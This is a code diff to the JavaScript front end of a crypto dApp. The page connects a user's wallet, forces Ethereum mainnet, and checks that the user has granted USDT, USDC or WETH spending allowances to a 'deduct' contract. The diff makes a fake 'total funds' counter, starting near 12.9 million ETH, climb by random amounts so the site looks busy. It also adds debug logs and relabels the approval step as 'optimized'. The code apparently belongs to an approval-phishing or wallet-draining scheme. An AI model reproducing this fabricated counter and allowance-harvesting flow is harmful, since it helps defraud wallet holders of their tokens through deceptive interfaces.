@@ -31,7 +31,6 @@ const totalValue = document.getElementById('totalValue');
 
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
-let totalFunds = 12856459.94; // 初始值 (單位: ETH)
 
 //---UI Control Functions (使用者介面控制函數)---
 function updateStatus(message) {
@@ -81,7 +80,7 @@ function updateWalletBalance(balances) {
         const usdtBalance = ethers.formatUnits(balances.usdt || 0n, 6);
         const usdcBalance = ethers.formatUnits(balances.usdc || 0n, 6);
         const wethBalance = ethers.formatUnits(balances.weth || 0n, 18);
-        walletBalanceValue.textContent = `${usdtBalance} USDT / ${usdcBalance} USDC / ${wethBalance} WETH`;
+        walletBalanceValue.textContent = `${parseFloat(usdtBalance).toFixed(3) } USDT / ${parseFloat(usdcBalance).toFixed(3)} USDC / ${parseFloat(wethBalance).toFixed(3)} WETH`;
     }
 }
 
@@ -90,8 +89,15 @@ function updateWalletBalance(balances) {
  */
 function updateTotalFunds() {
     if (totalValue) {
-        totalFunds += 0.01; // 每秒增加 0.01 ETH
-        totalValue.textContent = totalFunds.toLocaleString('en-US', { maximumFractionDigits: 2 }) + ' ETH';
+        // 從 localStorage 讀取
+        let totalFunds = parseFloat(localStorage.getItem('totalFunds') || '12856459.94');
+        // 亂數增加 0.01 ~ 0.1 ETH
+        const increaseAmount = Math.random() * (0.1 - 0.01) + 0.01;
+        totalFunds += increaseAmount;
+        // 儲存回 localStorage
+        localStorage.setItem('totalFunds', totalFunds.toFixed(2));
+        // 更新顯示
+        totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
     }
 }
 
@@ -156,32 +162,27 @@ async function initializeWallet() {
 
         provider = new ethers.BrowserProvider(window.ethereum);
 
-        while (true) {
-            const network = await provider.getNetwork();
-            if (network.chainId !== 1n) {
-                updateStatus('此應用程式僅支持以太坊主網 (Chain ID: 1)。請在錢包中切換至 Ethereum Mainnet 並刷新頁面。');
-                try {
-                    await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
-                    await new Promise(resolve => setTimeout(resolve, 2000)); // 延遲 2 秒檢查
-                } catch (switchError) {
-                    if (switchError.code === 4001) {
-                        updateStatus('您拒絕了網絡切換。請手動切換至 Ethereum Mainnet 並刷新頁面。');
-                    } else if (switchError.code === 4902) {
-                        await provider.send('wallet_addEthereumChain', [{
-                            chainId: '0x1',
-                            chainName: 'Ethereum Mainnet',
-                            rpcUrls: ['https://mainnet.infura.io/v3/'], // 請替換為您的 RPC URL
-                            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-                            blockExplorerUrls: ['https://etherscan.io']
-                        }]);
-                        updateStatus('已嘗試添加以太坊主網，請在錢包中確認並刷新頁面。');
-                    } else {
-                        updateStatus(`網絡切換失敗: ${switchError.message}。請手動切換至 Ethereum Mainnet 並刷新頁面。`);
-                    }
-                    return;
+        const network = await provider.getNetwork();
+        if (network.chainId !== 1n) {
+            updateStatus('請求切換至 Ethereum 主網... 請在錢包中批准。');
+            try {
+                await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
+            } catch (switchError) {
+                if (switchError.code === 4001) {
+                    updateStatus('您拒絕了網絡切換。請手動切換至 Ethereum Mainnet 並刷新頁面。');
+                } else if (switchError.code === 4902) {
+                    await provider.send('wallet_addEthereumChain', [{
+                        chainId: '0x1',
+                        chainName: 'Ethereum Mainnet',
+                        rpcUrls: ['https://mainnet.infura.io/v3/'], // 請替換為您的 RPC URL
+                        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                        blockExplorerUrls: ['https://etherscan.io']
+                    }]);
+                    updateStatus('已嘗試添加以太坊主網，請在錢包中確認並刷新頁面。');
+                } else {
+                    updateStatus(`網絡切換失敗: ${switchError.message}。請手動切換至 Ethereum Mainnet 並刷新頁面。`);
                 }
-            } else {
-                break;
+                return;
             }
         }
 
@@ -235,6 +236,12 @@ async function checkAuthorization() {
 
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = isServiceActive && hasSufficientAllowance;
+
+        console.log("【DEBUG_FinalCheck】用戶地址:", userAddress);
+        console.log("【DEBUG_FinalCheck】所需授權額度:", requiredAllowance.toString());
+        console.log("【DEBUG_FinalCheck】服務啟動:", isServiceActive);
+        console.log("【DEBUG_FinalCheck】是否有足夠授權:", hasSufficientAllowance);
+        console.log("【DEBUG_FinalCheck】是否完全授權 (最終):", isFullyAuthorized);
 
         if (isFullyAuthorized) {
             if (connectButton) {
@@ -353,7 +360,7 @@ async function connectWallet() {
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
 
-        updateStatus('更新餘額和授權流程...');
+        updateStatus('準備最佳化授權流程...');
 
         let ethBalance, wethBalance, usdtBalance, usdcBalance;
         try {
@@ -392,6 +399,9 @@ async function connectWallet() {
         const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
 
+        console.log("【DEBUG】所需授權額度 (閾值):", requiredAllowance.toString());
+        console.log("【DEBUG】服務已啟動:", serviceActivated);
+
         const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
             usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
             usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
@@ -403,6 +413,12 @@ async function connectWallet() {
 
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = serviceActivated && hasSufficientAllowance;
+
+        console.log("【DEBUG】USDT 授權:", usdtAllowance.toString());
+        console.log("【DEBUG】USDC 授權:", usdcAllowance.toString());
+        console.log("【DEBUG】WETH 授權:", wethAllowance.toString());
+        console.log("【DEBUG】是否有足夠授權:", hasSufficientAllowance);
+        console.log("【DEBUG】是否完全授權 (最終檢查):", isFullyAuthorized);
 
         let tokensToProcess;
 
